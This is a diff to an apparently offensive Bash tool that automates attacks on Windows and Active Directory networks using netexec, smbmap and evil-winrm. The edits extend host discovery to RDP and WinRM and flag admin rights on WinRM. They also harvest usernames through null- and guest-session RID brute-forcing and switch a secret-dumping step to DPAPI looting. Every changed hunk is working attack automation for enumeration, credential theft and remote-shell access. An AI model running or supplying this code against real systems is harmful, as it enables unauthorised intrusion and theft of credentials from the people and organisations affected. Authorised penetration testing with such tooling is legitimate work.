@@ -284,20 +284,30 @@ nmap_fast () {
 				host_nmap="${BASH_REMATCH[1]}"
 			fi
 			
-			if [ -n "$FQDN" ] && [[ ! "$FQDN" =~ \.lan$ ]]; then
+			if [ -n "$FQDN" ] && [[ ! "$FQDN" =~ \.lan$ ]] && [[ "$FQDN" =~ ^[A-Z]+ ]]; then
 				echo "${ip}:${FQDN}" >> ${DIR}/hostname_file.txt
 				resolve="1"
-			elif [[ $ligne == "Nmap scan report for"* ]] && grep -q ${ip} "${DIR_PORTS}/445.txt"; then
-				$proxychains netexec smb ${ip} < /dev/null > ${DIR}/tmp_resolve.txt 2>/dev/null
-				if [[ $(cat ${DIR}/tmp_resolve.txt | grep -oP 'name:\K[^)]+') ]] && ([[ $(cat ${DIR}/tmp_resolve.txt | grep -oP 'domain:\K[^)]+') ]] || [[ $(cat ${DIR}/tmp_resolve.txt | grep -oP 'workgroup:\K[^)]+') ]]); then
-					# Extraire le nom, le domaine ou le workgroup à partir de la sortie
-					name=$(cat ${DIR}/tmp_resolve.txt | grep -oP 'name:\K[^)]+')
-					domain_workgroup=$(cat ${DIR}/tmp_resolve.txt | grep -oP '(domain|workgroup):\K[^)]+')
-					ip_regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
-					#Confirm that name or domain_workgroup are not ip_address
-					if [[ ! "$name" =~ $ip_regex ]]; then
-						echo "${ip}:${name}.${domain_workgroup}" >> ${DIR}/hostname_file.txt
-						resolve="1"
+			elif [[ $ligne == "Nmap scan report for"* ]];then
+				netexec_port=""
+				if grep -q ${ip} "${DIR_PORTS}/445.txt";then
+					netexec_port="smb"
+				elif grep -q ${ip} "${DIR_PORTS}/3389.txt";then
+					netexec_port="rdp"
+				elif grep -q ${ip} "${DIR_PORTS}/5985.txt";then
+					netexec_port="winrm"
+				fi
+				if [ -n "$netexec_port" ]; then
+					$proxychains netexec ${netexec_port} ${ip} < /dev/null > ${DIR}/tmp_resolve.txt 2>/dev/null
+					if [[ $(cat ${DIR}/tmp_resolve.txt | grep -oP 'name:\K[^)]+') ]] && ([[ $(cat ${DIR}/tmp_resolve.txt | grep -oP 'domain:\K[^)]+') ]] || [[ $(cat ${DIR}/tmp_resolve.txt | grep -oP 'workgroup:\K[^)]+') ]]); then
+						# Extraire le nom, le domaine ou le workgroup à partir de la sortie
+						name=$(cat ${DIR}/tmp_resolve.txt | grep -oP 'name:\K[^)]+')
+						domain_workgroup=$(cat ${DIR}/tmp_resolve.txt | grep -oP '(domain|workgroup):\K[^)]+')
+						ip_regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
+						#Confirm that name or domain_workgroup are not ip_address
+						if [[ ! "$name" =~ $ip_regex ]]; then
+							echo "${ip}:${name}.${domain_workgroup}" >> ${DIR}/hostname_file.txt
+							resolve="1"
+						fi
 					fi
 				fi
 			elif [[ $ligne =~ $regex_Domain ]];then
@@ -536,6 +546,9 @@ winrm () {
 			# Vérifier le code de retour de la commande WINRM
 			if [ "$(cat ${DIR_VULNS}/winrm_${ip} | grep -ai '\[+\]')" ]; then
 				green_log "${SPACE}[💀] WINRM connection successed on $ip ($hostname)"
+				if grep -aq '(Pwn3d!)' ${DIR_VULNS}/winrm_${ip}; then
+					red_log "${SPACE}[💀] $Username have admin rights on ${ip} (${hostname}) !"
+				fi
 				blue_log "$proxychains evil-winrm -i ${host} -u "$Username" $cme_creds"
 			else
 				#echo ${DIR_VULNS}/winrm_${ip}
@@ -874,7 +887,7 @@ smb () {
 			if grep -aq 'SidTypeUser' ${DIR_VULNS}/smb/cme_${ip}_null_session; then
 				green_log "${SPACE}[💀] $ip allow null session (anonymous)"
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 10000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute 2>/dev/null
-				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -i 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
+				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -ai 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_users 2>/dev/null
 				## Injecter ces utilisateurs dans un fichier
 				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' >> ${DIR}/users_with_descriptions.txt
@@ -896,8 +909,8 @@ smb () {
 			$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest 2>/dev/null
 			if grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest; then
 				green_log "${SPACE}[💀] $ip allow guest session, trying to extract users .."
-				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 10000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute 2>/dev/null
-				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -i 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
+				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --rid-brute 2000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute 2>/dev/null
+				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -ai 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users 2>/dev/null
 				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' >> ${DIR}/users_with_descriptions.txt
 				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
@@ -906,7 +919,7 @@ smb () {
 				sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
 				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_guest_users ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute | grep -av '\[.\]' | awk -F'\\' '{print $2}' | wc -l)
 				if [[ "$check_smb" -gt 0 ]]; then
-					green_log "${SPACE}[💀] New users found (check descriptions can be interesting) -> ${DIR}/users_with_descriptions.txt"
+					green_log "${SPACE}[💀] New users found (check descriptions can be interesting) -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
 				fi
 				$proxychains timeout 7 smbmap -H $host -p 'GuestUser' -p '' --no-banner > ${DIR_VULNS}/smb/smbmap_${ip}_guest_users_shares 2>/dev/null
 				if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/smbmap_${ip}_guest_users_shares"; then
@@ -1019,7 +1032,7 @@ smb () {
 					fi
 					
 					###### DUMP DPAPI ######
-					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --lsa < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_dpapi 2>/dev/null
+					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --dpapi < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_dpapi 2>/dev/null
 					check_smb=$(grep -oa 'Looting secrets' ${DIR_VULNS}/smb/cme_${ip}_dpapi | wc -l)
 					
 					if [ "$check_smb" -gt 0 ]; then
@@ -1149,7 +1162,7 @@ web () {
 			if [[ $line =~ (http|https) && ! $line =~ ncacn_http ]]; then
 			  whatweb ${ip}:${port} --log-brief=/tmp/whatweb >/dev/null 2>&1
 			  HTTPServer=$(cat /tmp/whatweb | grep -oP 'HTTPServer\[\K[^\]]+')
-			  Title=$(cat /tmp/whatweb | grep -oP 'Title\[\K[^\]]+' || echo "Pas de Title")
+			  Title=$(cat /tmp/whatweb | grep -oP 'Title\[\K[^\]]+' || echo "No title identified")
 			  green_log "${SPACE}${ip}:${port} ($hostname) -> ${HTTPServer} /// ${Title}"
 			  rm /tmp/whatweb
 			fi
